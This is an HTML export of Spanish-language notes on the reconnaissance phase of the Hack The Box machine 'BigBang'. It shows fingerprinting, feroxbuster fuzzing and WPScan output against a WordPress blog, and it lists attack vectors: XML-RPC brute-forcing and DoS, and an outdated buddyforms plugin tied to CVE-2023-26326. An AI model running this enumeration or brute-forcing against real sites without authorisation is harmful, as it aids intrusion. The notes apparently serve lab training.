<!DOCTYPE html> <html><head>
		<title>01-Recon</title>
		<base href="../../">
		<meta id="root-path" root-path="../../">
		<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, minimum-scale=1.0, maximum-scale=5.0">
		<meta charset="UTF-8">
		<meta name="description" content="HTB - 01-Recon">
		<meta property="og:title" content="01-Recon">
		<meta property="og:description" content="HTB - 01-Recon">
		<meta property="og:type" content="website">
		<meta property="og:url" content="machines/bigbang/01-recon.html">
		<meta property="og:image" content="machines/bigbang/imgs/pasted-image-20250131121917.png">
		<meta property="og:site_name" content="HTB">
		<link rel="alternate" type="application/rss+xml" title="RSS Feed" href="lib/rss.xml"><script async="" id="webpage-script" src="lib/scripts/webpage.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><script type="module" async="" id="graph-view-script" src="lib/scripts/graph-view.js"></script><script async="" id="graph-wasm-script" src="lib/scripts/graph-wasm.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><script async="" id="graph-render-worker-script" src="lib/scripts/graph-render-worker.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><script async="" id="tinycolor-script" src="lib/scripts/tinycolor.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><script async="" id="pixi-script" src="https://cdnjs.cloudflare.com/ajax/libs/pixi.js/7.4.0/pixi.min.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><script async="" id="minisearch-script" src="https://cdn.jsdelivr.net/npm/minisearch@6.3.0/dist/umd/index.min.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><link rel="icon" href="lib/media/favicon.png"><script async="" id="graph-data-script" src="lib/scripts/graph-data.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><style>body{--line-width:40em;--line-width-adaptive:40em;--file-line-width:40em;--sidebar-width:min(20em, 80vw);--collapse-arrow-size:11px;--tree-horizontal-spacing:0.6em;--tree-vertical-spacing:0.6em;--sidebar-margin:12px}.sidebar{height:100%;min-width:calc(var(--sidebar-width) + var(--divider-width-hover));max-width:calc(var(--sidebar-width) + var(--divider-width-hover));font-size:14px;z-index:10;position:relative;overflow:hidden;transition:min-width ease-in-out,max-width ease-in-out;transition-duration:.2s;contain:size}.sidebar-left{left:0}.sidebar-right{right:0}.sidebar.is-collapsed{min-width:0;max-width:0}body.floating-sidebars .sidebar{position:absolute}.sidebar-content{height:100%;min-width:calc(var(--sidebar-width) - var(--divider-width-hover));top:0;padding:var(--sidebar-margin);padding-top:4em;line-height:var(--line-height-tight);background-color:var(--background-secondary);transition:background-color,border-right,border-left,box-shadow;transition-duration:var(--color-fade-speed);transition-timing-function:ease-in-out;position:absolute;display:flex;flex-direction:column}.sidebar:not(.is-collapsed) .sidebar-content{min-width:calc(max(100%,var(--sidebar-width)) - 3px);max-width:calc(max(100%,var(--sidebar-width)) - 3px)}.sidebar-left .sidebar-content{left:0;border-top-right-radius:var(--radius-l);border-bottom-right-radius:var(--radius-l)}.sidebar-right .sidebar-content{right:0;border-top-left-radius:var(--radius-l);border-bottom-left-radius:var(--radius-l)}.sidebar:has(.sidebar-content:empty):has(.topbar-content:empty){display:none}.sidebar-topbar{height:2em;width:var(--sidebar-width);top:var(--sidebar-margin);padding-inline:var(--sidebar-margin);z-index:1;position:fixed;display:flex;align-items:center;transition:width ease-in-out;transition-duration:inherit}.sidebar.is-collapsed .sidebar-topbar{width:calc(2.3em + var(--sidebar-margin) * 2)}.sidebar .sidebar-topbar.is-collapsed{width:0}.sidebar-left .sidebar-topbar{left:0}.sidebar-right .sidebar-topbar{right:0}.topbar-content{overflow:hidden;overflow:clip;width:100%;height:100%;display:flex;align-items:center;transition:inherit}.sidebar.is-collapsed .topbar-content{width:0;transition:inherit}.clickable-icon.sidebar-collapse-icon{background-color:transparent;color:var(--icon-color-focused);padding:0!important;margin:0!important;height:100%!important;width:2.3em!important;margin-inline:0.14em!important;position:absolute}.sidebar-left .clickable-icon.sidebar-collapse-icon{transform:rotateY(180deg);right:var(--sidebar-margin)}.sidebar-right .clickable-icon.sidebar-collapse-icon{transform:rotateY(180deg);left:var(--sidebar-margin)}.clickable-icon.sidebar-collapse-icon svg.svg-icon{width:100%;height:100%}.sidebar-section-header{margin:0 0 1em 0;text-transform:uppercase;letter-spacing:.06em;font-weight:600}body{transition:background-color var(--color-fade-speed) ease-in-out}.webpage-container{display:flex;flex-direction:row;height:100%;width:100%;align-items:stretch;justify-content:center}.document-container{opacity:1;flex-basis:100%;max-width:100%;width:100%;height:100%;display:flex;flex-direction:column;align-items:center;transition:opacity .2s ease-in-out;contain:inline-size}.hide{opacity:0;transition:opacity .2s ease-in-out}.document-container>.markdown-preview-view{margin:var(--sidebar-margin);margin-bottom:0;width:100%;width:-webkit-fill-available;width:-moz-available;width:fill-available;background-color:var(--background-primary);transition:background-color var(--color-fade-speed) ease-in-out;border-top-right-radius:var(--window-radius,var(--radius-m));border-top-left-radius:var(--window-radius,var(--radius-m));overflow-x:hidden!important;overflow-y:auto!important;display:flex!important;flex-direction:column!important;align-items:center!important;contain:inline-size}.document-container>.markdown-preview-view>.markdown-preview-sizer{padding-bottom:80vh!important;width:100%!important;max-width:var(--line-width)!important;flex-basis:var(--line-width)!important;transition:background-color var(--color-fade-speed) ease-in-out;contain:inline-size}.markdown-rendered img:not([width]),.view-content img:not([width]){max-width:100%;outline:0}.document-container>.view-content.embed{display:flex;padding:1em;height:100%;width:100%;align-items:center;justify-content:center}.document-container>.view-content.embed>*{max-width:100%;max-height:100%;object-fit:contain}:has(> :is(.math,table)){overflow-x:auto!important}.document-container>.view-content{overflow-x:auto;contain:content;padding:0;margin:0;height:100%}.scroll-highlight{position:absolute;width:100%;height:100%;pointer-events:none;z-index:1000;background-color:hsla(var(--color-accent-hsl),.25);opacity:0;padding:1em;inset:50%;translate:-50% -50%;border-radius:var(--radius-s)}</style><script defer="">async function loadIncludes(){if("file:"!=location.protocol){let e=document.querySelectorAll("include");for(let t=0;t<e.length;t++){let o=e[t],l=o.getAttribute("src");try{const e=await fetch(l);if(!e.ok){console.log("Could not include file: "+l),o?.remove();continue}let t=await e.text(),n=document.createRange().createContextualFragment(t),i=Array.from(n.children);for(let e of i)e.classList.add("hide"),e.style.transition="opacity 0.5s ease-in-out",setTimeout((()=>{e.classList.remove("hide")}),10);o.before(n),o.remove(),console.log("Included file: "+l)}catch(e){o?.remove(),console.log("Could not include file: "+l,e);continue}}}else{if(document.querySelectorAll("include").length>0){var e=document.createElement("div");e.id="error",e.textContent="Web server exports must be hosted on an http / web server to be viewed correctly.",e.style.position="fixed",e.style.top="50%",e.style.left="50%",e.style.transform="translate(-50%, -50%)",e.style.fontSize="1.5em",e.style.fontWeight="bold",e.style.textAlign="center",document.body.appendChild(e),document.querySelector(".document-container")?.classList.remove("hide")}}}document.addEventListener("DOMContentLoaded",(()=>{loadIncludes()}));let isFileProtocol="file:"==location.protocol;function waitLoadScripts(e,t){let o=e.map((e=>document.getElementById(e+"-script"))),l=0;!function e(){let n=o[l];l++,n&&"true"!=n.getAttribute("loaded")||l<o.length&&e(),l<o.length?n.addEventListener("load",e):t()}()}</script><link rel="stylesheet" href="lib/styles/obsidian.css"><link rel="stylesheet" href="lib/styles/theme.css"><link rel="preload" href="lib/styles/global-variable-styles.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><noscript><link rel="stylesheet" href="lib/styles/global-variable-styles.css"></noscript><link rel="preload" href="lib/styles/main-styles.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><noscript><link rel="stylesheet" href="lib/styles/main-styles.css"></noscript></head><body class="publish css-settings-manager theme-dark show-inline-title show-ribbon"><script defer="">let theme=localStorage.getItem("theme")||(window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light");"dark"==theme?(document.body.classList.add("theme-dark"),document.body.classList.remove("theme-light")):(document.body.classList.add("theme-light"),document.body.classList.remove("theme-dark")),window.innerWidth<480?document.body.classList.add("is-phone"):window.innerWidth<768?document.body.classList.add("is-tablet"):window.innerWidth<1024?document.body.classList.add("is-small-screen"):document.body.classList.add("is-large-screen")</script><div class="webpage-container workspace"><div class="sidebar-left sidebar"><div class="sidebar-handle"></div><div class="sidebar-topbar"><div class="topbar-content"><label class="theme-toggle-container" for="theme_toggle"><input class="theme-toggle-input" type="checkbox" id="theme_toggle"><div class="toggle-background"></div></label></div><div class="clickable-icon sidebar-collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" class="svg-icon"><path d="M21 3H3C1.89543 3 1 3.89543 1 5V19C1 20.1046 1.89543 21 3 21H21C22.1046 21 23 20.1046 23 19V5C23 3.89543 22.1046 3 21 3Z"></path><path d="M10 4V20"></path><path d="M4 7H7"></path><path d="M4 10H7"></path><path d="M4 13H7"></path></svg></div></div><div class="sidebar-content"><div class="search-input-container"><input enterkeyhint="search" type="search" spellcheck="false" placeholder="Search..."><div class="search-input-clear-button" aria-label="Clear search"></div></div><include src="lib/html/file-tree.html"></include></div><script defer="">let ls = document.querySelector(".sidebar-left"); ls.classList.add("is-collapsed"); if (window.innerWidth > 768) ls.classList.remove("is-collapsed"); ls.style.setProperty("--sidebar-width", localStorage.getItem("sidebar-left-width"));</script></div><div class="document-container markdown-reading-view hide"><div class="markdown-preview-view markdown-rendered allow-fold-headings allow-fold-lists is-readable-line-width"><style id="MJX-CHTML-styles"></style><div class="markdown-preview-sizer markdown-preview-section"><h1 class="page-title heading inline-title" id="01-Recon"><p dir="auto">01-Recon</p></h1><div class="el-h2 heading-wrapper"><h2 data-heading="Port 80 - Blog.bigbang.htb" dir="auto" class="heading" id="Port_80_-_Blog.bigbang.htb"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>Port 80 - Blog.bigbang.htb</h2><div class="heading-children"><div class="el-p"><p dir="auto">Al entrar en el puerto 80 se redirige automaticamente al subdominio <a rel="noopener nofollow" class="external-link" href="http://blog.bigbang.htb/" target="_blank">http://blog.bigbang.htb/</a> por lo que lo guardamos en el '/etc/hosts'</p></div><div class="el-pre"><pre class="language-bash" tabindex="0"><code data-line="0" class="language-bash is-loaded"><span class="token builtin class-name">echo</span> <span class="token string">"10.10.11.52 blog.bigbang.htb"</span> <span class="token operator">&gt;&gt;</span> /etc/hosts
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">En el puerto 80 nos encontramos un blog de wordpress:</p></div><div class="el-pre"><pre class="language-java" tabindex="0"><code data-line="0" class="language-java is-loaded">➜  <span class="token class-name">BigBang</span> wappalyzer <span class="token operator">-</span>i http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>blog<span class="token punctuation">.</span>bigbang<span class="token punctuation">.</span>htb
http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>blog<span class="token punctuation">.</span>bigbang<span class="token punctuation">.</span>htb <span class="token class-name">Apache</span> <span class="token constant">HTTP</span> <span class="token class-name">Server</span> v2<span class="token punctuation">.</span><span class="token number">4.62</span><span class="token punctuation">,</span> <span class="token class-name">Debian</span><span class="token punctuation">,</span> <span class="token constant">PHP</span> v8<span class="token punctuation">.</span><span class="token number">3.2</span><span class="token punctuation">,</span> <span class="token class-name">WordPress</span> v6<span class="token punctuation">.</span><span class="token number">5.4</span><span class="token punctuation">,</span> <span class="token class-name">Backbone</span><span class="token punctuation">.</span>js v1<span class="token punctuation">.</span><span class="token number">5.0</span><span class="token punctuation">,</span> <span class="token class-name">Clipboard</span><span class="token punctuation">.</span>js<span class="token punctuation">,</span> jQuery v3<span class="token punctuation">.</span><span class="token number">7.1</span><span class="token punctuation">,</span> jQuery <span class="token class-name">Migrate</span> v3<span class="token punctuation">.</span><span class="token number">4.1</span><span class="token punctuation">,</span> <span class="token class-name">TinyMCE</span> v4<span class="token punctuation">,</span> <span class="token class-name">Underscore</span><span class="token punctuation">.</span>js v1<span class="token punctuation">.</span><span class="token number">13.4</span><span class="token punctuation">,</span> core<span class="token operator">-</span>js v3<span class="token punctuation">.</span><span class="token number">35.1</span><span class="token punctuation">,</span> <span class="token class-name">Dropzone</span> v5<span class="token punctuation">.</span><span class="token number">7.0</span><span class="token punctuation">,</span> jQuery <span class="token constant">UI</span> v1<span class="token punctuation">.</span><span class="token number">13.2</span><span class="token punctuation">,</span> <span class="token class-name">Lodash</span> v1<span class="token punctuation">.</span><span class="token number">13.6</span><span class="token punctuation">,</span> <span class="token class-name">MediaElement</span><span class="token punctuation">.</span>js v4<span class="token punctuation">.</span><span class="token number">2.17</span><span class="token punctuation">,</span> mOxie<span class="token punctuation">,</span> <span class="token class-name">Select2</span><span class="token punctuation">,</span> <span class="token class-name">Twitter</span> <span class="token class-name">Emoji</span> <span class="token punctuation">(</span><span class="token class-name">Twemoji</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant">RSS</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20250131121917.png" src="Pasted image 20250131121917.png" class="internal-embed media-embed image-embed is-loaded"><img alt="Pasted image 20250131121917.png" src="machines/bigbang/imgs/pasted-image-20250131121917.png"></span></p></div><div class="el-h3 heading-wrapper"><h3 data-heading="Fuzzing" dir="auto" class="heading" id="Fuzzing"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>Fuzzing</h3><div class="heading-children"><div class="el-p"><p dir="auto">Vamos a fuzzear el wordpress para encontrar archivos accesibles interesantes:</p></div><div class="el-pre"><pre class="language-bash" tabindex="0"><code data-line="0" class="language-bash is-loaded">➜  BigBang <span class="token function">find</span> /usr/share/seclists/ <span class="token parameter variable">-type</span> f <span class="token parameter variable">-iname</span> <span class="token string">'wordpress*'</span>

/usr/share/seclists/Passwords/Honeypot-Captures/wordpress-attacks-july2014.txt
/usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/wordpress.txt
/usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/wordpress-all-levels.txt
/usr/share/seclists/Discovery/Web-Content/CMS/wordpress.fuzz.txt
➜  BigBang feroxbuster <span class="token parameter variable">-u</span> http://blog.bigbang.htb <span class="token parameter variable">-w</span> /usr/share/seclists/Discovery/Web-Content/CMS/wordpress.fuzz.txt

<span class="token number">200</span>      GET      182l      398w     3834c http://blog.bigbang.htb/wp-admin/css/color-picker.css
<span class="token number">200</span>      GET      384l     3177w    19915c http://blog.bigbang.htb/license.txt
<span class="token number">200</span>      GET        1l        1w        2c http://blog.bigbang.htb/wp-admin/admin-footer.php
<span class="token number">200</span>      GET        2l     1375w    58586c http://blog.bigbang.htb/wp-admin/css/customize-controls-rtl.min.css
<span class="token number">200</span>      GET      397l      781w     6223c http://blog.bigbang.htb/wp-admin/css/install-rtl.css
<span class="token number">200</span>      GET      396l      775w     6190c http://blog.bigbang.htb/wp-admin/css/install.css
<span class="token number">200</span>      GET      479l     1182w    12597c http://blog.bigbang.htb/wp-admin/css/customize-widgets-rtl.css
<span class="token number">200</span>      GET     2037l     3990w    37699c http://blog.bigbang.htb/wp-admin/css/edit.css
<span class="token number">200</span>      GET       16l       36w      490c http://blog.bigbang.htb/wp-admin/css/wp-admin-rtl.css
<span class="token number">200</span>      GET       16l       36w      490c http://blog.bigbang.htb/wp-admin/css/wp-tables.min.css

etc<span class="token punctuation">..</span>.
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">Para una busqueda mas detallada del wordpress podemos usar <a data-tooltip-position="top" aria-label="https://wpscan.com/" rel="noopener nofollow" class="external-link" href="https://wpscan.com/" target="_blank">WpScan</a> que es una herramienta que nos permite buscar vulnerabilidades de wordpress</p></div><div class="el-pre"><pre class="language-bash" tabindex="0"><code data-line="0" class="language-bash is-loaded"><span class="token punctuation">[</span>+<span class="token punctuation">]</span> URL: http://blog.bigbang.htb/ <span class="token punctuation">[</span><span class="token number">10.10</span>.11.52<span class="token punctuation">]</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Started: Fri Jan <span class="token number">31</span> <span class="token number">13</span>:23:49 <span class="token number">2025</span>

Interesting Finding<span class="token punctuation">(</span>s<span class="token punctuation">)</span>:

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Headers
 <span class="token operator">|</span> Interesting Entries:
 <span class="token operator">|</span>  - Server: Apache/2.4.62 <span class="token punctuation">(</span>Debian<span class="token punctuation">)</span>
 <span class="token operator">|</span>  - X-Powered-By: PHP/8.3.2
 <span class="token operator">|</span> Found By: Headers <span class="token punctuation">(</span>Passive Detection<span class="token punctuation">)</span>
 <span class="token operator">|</span> Confidence: <span class="token number">100</span>%

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> XML-RPC seems to be enabled: http://blog.bigbang.htb/xmlrpc.php
 <span class="token operator">|</span> Found By: Direct Access <span class="token punctuation">(</span>Aggressive Detection<span class="token punctuation">)</span>
 <span class="token operator">|</span> Confidence: <span class="token number">100</span>%
 <span class="token operator">|</span> References:
 <span class="token operator">|</span>  - http://codex.wordpress.org/XML-RPC_Pingback_API
 <span class="token operator">|</span>  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 <span class="token operator">|</span>  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 <span class="token operator">|</span>  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 <span class="token operator">|</span>  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> WordPress readme found: http://blog.bigbang.htb/readme.html
 <span class="token operator">|</span> Found By: Direct Access <span class="token punctuation">(</span>Aggressive Detection<span class="token punctuation">)</span>
 <span class="token operator">|</span> Confidence: <span class="token number">100</span>%

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Upload directory has listing enabled: http://blog.bigbang.htb/wp-content/uploads/
 <span class="token operator">|</span> Found By: Direct Access <span class="token punctuation">(</span>Aggressive Detection<span class="token punctuation">)</span>
 <span class="token operator">|</span> Confidence: <span class="token number">100</span>%

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> The external WP-Cron seems to be enabled: http://blog.bigbang.htb/wp-cron.php
 <span class="token operator">|</span> Found By: Direct Access <span class="token punctuation">(</span>Aggressive Detection<span class="token punctuation">)</span>
 <span class="token operator">|</span> Confidence: <span class="token number">60</span>%
 <span class="token operator">|</span> References:
 <span class="token operator">|</span>  - https://www.iplocation.net/defend-wordpress-from-ddos
 <span class="token operator">|</span>  - https://github.com/wpscanteam/wpscan/issues/1299

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> WordPress version <span class="token number">6.5</span>.4 identified <span class="token punctuation">(</span>Insecure, released on <span class="token number">2024</span>-06-05<span class="token punctuation">)</span>.
 <span class="token operator">|</span> Found By: Rss Generator <span class="token punctuation">(</span>Passive Detection<span class="token punctuation">)</span>
 <span class="token operator">|</span>  - http://blog.bigbang.htb/?feed<span class="token operator">=</span>rss2, <span class="token operator">&lt;</span>generator<span class="token operator">&gt;</span>https://wordpress.org/?v<span class="token operator">=</span><span class="token number">6.5</span>.<span class="token operator"><span class="token file-descriptor important">4</span>&lt;</span>/generator<span class="token operator">&gt;</span>
 <span class="token operator">|</span>  - http://blog.bigbang.htb/?feed<span class="token operator">=</span>comments-rss2, <span class="token operator">&lt;</span>generator<span class="token operator">&gt;</span>https://wordpress.org/?v<span class="token operator">=</span><span class="token number">6.5</span>.<span class="token operator"><span class="token file-descriptor important">4</span>&lt;</span>/generator<span class="token operator">&gt;</span>

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> WordPress theme <span class="token keyword">in</span> use: twentytwentyfour
 <span class="token operator">|</span> Location: http://blog.bigbang.htb/wp-content/themes/twentytwentyfour/
 <span class="token operator">|</span> Last Updated: <span class="token number">2024</span>-11-13T00:00:00.000Z
 <span class="token operator">|</span> Readme: http://blog.bigbang.htb/wp-content/themes/twentytwentyfour/readme.txt
 <span class="token operator">|</span> <span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> The version is out of date, the latest version is <span class="token number">1.3</span>
 <span class="token operator">|</span> <span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Directory listing is enabled
 <span class="token operator">|</span> Style URL: http://blog.bigbang.htb/wp-content/themes/twentytwentyfour/style.css
 <span class="token operator">|</span> Style Name: Twenty Twenty-Four
 <span class="token operator">|</span> Style URI: https://wordpress.org/themes/twentytwentyfour/
 <span class="token operator">|</span> Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti<span class="token punctuation">..</span>.
 <span class="token operator">|</span> Author: the WordPress team
 <span class="token operator">|</span> Author URI: https://wordpress.org
 <span class="token operator">|</span>
 <span class="token operator">|</span> Found By: Urls In Homepage <span class="token punctuation">(</span>Passive Detection<span class="token punctuation">)</span>
 <span class="token operator">|</span>
 <span class="token operator">|</span> Version: <span class="token number">1.1</span> <span class="token punctuation">(</span><span class="token number">80</span>% confidence<span class="token punctuation">)</span>
 <span class="token operator">|</span> Found By: Style <span class="token punctuation">(</span>Passive Detection<span class="token punctuation">)</span>
 <span class="token operator">|</span>  - http://blog.bigbang.htb/wp-content/themes/twentytwentyfour/style.css, Match: <span class="token string">'Version: 1.1'</span>

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Enumerating All Plugins <span class="token punctuation">(</span>via Passive Methods<span class="token punctuation">)</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Checking Plugin Versions <span class="token punctuation">(</span>via Passive and Aggressive Methods<span class="token punctuation">)</span>

<span class="token punctuation">[</span>i<span class="token punctuation">]</span> Plugin<span class="token punctuation">(</span>s<span class="token punctuation">)</span> Identified:

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> buddyforms
 <span class="token operator">|</span> Location: http://blog.bigbang.htb/wp-content/plugins/buddyforms/
 <span class="token operator">|</span> Last Updated: <span class="token number">2025</span>-01-30T02:58:00.000Z
 <span class="token operator">|</span> <span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> The version is out of date, the latest version is <span class="token number">2.8</span>.15
 <span class="token operator">|</span>
 <span class="token operator">|</span> Found By: Urls In Homepage <span class="token punctuation">(</span>Passive Detection<span class="token punctuation">)</span>
 <span class="token operator">|</span>
 <span class="token operator">|</span> Version: <span class="token number">2.7</span>.7 <span class="token punctuation">(</span><span class="token number">80</span>% confidence<span class="token punctuation">)</span>
 <span class="token operator">|</span> Found By: Readme - Stable Tag <span class="token punctuation">(</span>Aggressive Detection<span class="token punctuation">)</span>
 <span class="token operator">|</span>  - http://blog.bigbang.htb/wp-content/plugins/buddyforms/readme.txt

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Enumerating Config Backups <span class="token punctuation">(</span>via Passive and Aggressive Methods<span class="token punctuation">)</span>
 Checking Config Backups - Time: 00:00:02 <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">&gt;</span> <span class="token punctuation">(</span><span class="token number">137</span> / <span class="token number">137</span><span class="token punctuation">)</span> <span class="token number">100.00</span>% Time: 00:00:02

<span class="token punctuation">[</span>i<span class="token punctuation">]</span> No Config Backups Found.

<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> No WPScan API Token given, as a result vulnerability data has not been output.
<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> You can get a <span class="token function">free</span> API token with <span class="token number">25</span> daily requests by registering at https://wpscan.com/register

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Finished: Fri Jan <span class="token number">31</span> <span class="token number">13</span>:24:01 <span class="token number">2025</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Requests Done: <span class="token number">171</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Cached Requests: <span class="token number">5</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Data Sent: <span class="token number">44.029</span> KB
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Data Received: <span class="token number">778.725</span> KB
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Memory used: <span class="token number">296.125</span> MB
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Elapsed time: 00:00:12
➜  BigBang 


</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">Segun el Recon tenemos diferentes vectores de ataque:</p></div><div class="el-p"><p dir="auto">Vectores:<br>
1.Wordpress V 6.5.4 (insecure)<br>
La version de wordpress esta desactualizada.<br>
<a data-tooltip-position="top" aria-label="https://www.tenable.com/plugins/was/114353" rel="noopener nofollow" class="external-link" href="https://www.tenable.com/plugins/was/114353" target="_blank">Info</a><br>
2.XML-RPC Habilitado<br>
Con ello podemos:<br>
Brute-forcing credenciales usando el xmlrpc.php endpoint.<br>
Amplificar los DoS.<br>
Ataques de Pingback (denial of service)<br>
3. Pluggin buddyforms desactualizado<br>
Vulnerable a <a data-tooltip-position="top" aria-label="https://nvd.nist.gov/vuln/detail/CVE-2023-26326" rel="noopener nofollow" class="external-link" href="https://nvd.nist.gov/vuln/detail/CVE-2023-26326" target="_blank">CVE-2023-26326</a><br>
4. El Theme de Wordpress 'twentytwentyfour'<br>
Tiene la version desactualizada la actual ultima version es la  1.3<br>
